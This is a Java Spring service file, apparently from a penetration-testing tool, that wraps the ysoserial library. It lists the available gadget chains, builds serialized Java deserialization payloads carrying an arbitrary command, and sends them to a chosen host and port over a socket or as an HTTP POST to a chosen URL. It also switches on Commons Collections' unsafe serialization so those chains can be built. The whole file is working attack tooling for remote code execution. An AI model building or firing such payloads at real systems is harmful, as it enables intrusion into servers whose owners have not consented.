package com.yulock.payload.service.impl;

import com.yulock.payload.service.PayloadService;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;
import ysoserial.payloads.ObjectPayload;
import ysoserial.Serializer;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.util.*;

@Slf4j
@Service
public class PayloadServiceImpl implements PayloadService {
    
    static {
        // 启用Apache Commons Collections的不安全序列化（用于生成CC链Payload）
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
    }
    
    @Override
    public List<Map<String, Object>> getAvailableGadgets() {
        List<Map<String, Object>> gadgets = new ArrayList<>();
        
        // 获取可用的Gadget链
        Set<Class<? extends ObjectPayload>> payloadClasses = ObjectPayload.Utils.getPayloadClasses();
        for (Class<? extends ObjectPayload> clazz : payloadClasses) {
            try {
                Map<String, Object> gadget = new HashMap<>();
                gadget.put("name", clazz.getSimpleName());
                gadget.put("className", clazz.getName());
                
                // 获取依赖信息
                ysoserial.payloads.annotation.Dependencies deps = clazz.getAnnotation(ysoserial.payloads.annotation.Dependencies.class);
                if (deps != null) {
                    gadget.put("dependencies", String.join(", ", deps.value()));
                }
                
                // 获取作者信息
                ysoserial.payloads.annotation.Authors authors = clazz.getAnnotation(ysoserial.payloads.annotation.Authors.class);
                if (authors != null) {
                    String[] authorList = authors.value();
                    for (int i = 0; i < authorList.length; i++) {
                        authorList[i] = "@" + authorList[i];
                    }
                    gadget.put("authors", String.join(", ", authorList));
                }
                
                gadgets.add(gadget);
            } catch (Exception e) {
                log.warn("Failed to load gadget: {}", clazz.getName(), e);
            }
        }
        
        gadgets.sort(Comparator.comparing(m -> (String) m.get("name")));
        return gadgets;
    }
    
    @Override
    public byte[] generatePayload(String gadgetName, String command) {
        try {
            Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(gadgetName);
            if (payloadClass == null) {
                throw new IllegalArgumentException("Unknown gadget: " + gadgetName);
            }
            
            ObjectPayload payload = payloadClass.newInstance();
            Object object = payload.getObject(command);
            
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            Serializer.serialize(object, baos);
            
            ObjectPayload.Utils.releasePayload(payload, object);
            
            return baos.toByteArray();
        } catch (Exception e) {
            log.error("Failed to generate payload", e);
            throw new RuntimeException("Failed to generate payload: " + e.getMessage(), e);
        }
    }
    
    @Override
    public String testPayload(byte[] payload, String host, Integer port, String url, String type) {
        try {
            if ("socket".equals(type)) {
                return testViaSocket(payload, host, port);
            } else if ("url".equals(type)) {
                return testViaUrl(payload, url);
            } else {
                return testViaDeserialization(payload);
            }
        } catch (Exception e) {
            log.error("Payload test failed", e);
            return "Test failed: " + e.getMessage();
        }
    }
    
    private String testViaSocket(byte[] payload, String host, int port) {
        try (Socket socket = new Socket(host, port)) {
            socket.setSoTimeout(5000);
            socket.getOutputStream().write(payload);
            socket.getOutputStream().flush();
            return "Payload sent successfully to " + host + ":" + port;
        } catch (Exception e) {
            return "Failed to send payload: " + e.getMessage();
        }
    }

    private String testViaUrl(byte[] payload, String targetUrl) {
        try {
            URL url = new URL(targetUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(10000);
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("Content-Length", String.valueOf(payload.length));

            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload);
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            String responseMsg = readResponse(conn);
            return "HTTP " + responseCode + " - Payload sent to " + targetUrl + (responseMsg.isEmpty() ? "" : ". Response: " + responseMsg);
        } catch (Exception e) {
            return "Failed to send payload to URL: " + e.getMessage();
        }
    }

    private String readResponse(HttpURLConnection conn) {
        try (InputStream is = conn.getErrorStream() != null ? conn.getErrorStream() : conn.getInputStream()) {
            if (is == null) return "";
            byte[] buf = new byte[4096];
            int len = is.read(buf);
            return len > 0 ? new String(buf, 0, len) : "";
        } catch (Exception e) {
            return "";
        }
    }
    
    private String testViaDeserialization(byte[] payload) {
        // 安全的本地反序列化测试
        return "Payload generated successfully. Size: " + payload.length + " bytes. (Testing in isolated environment is recommended)";
    }
}
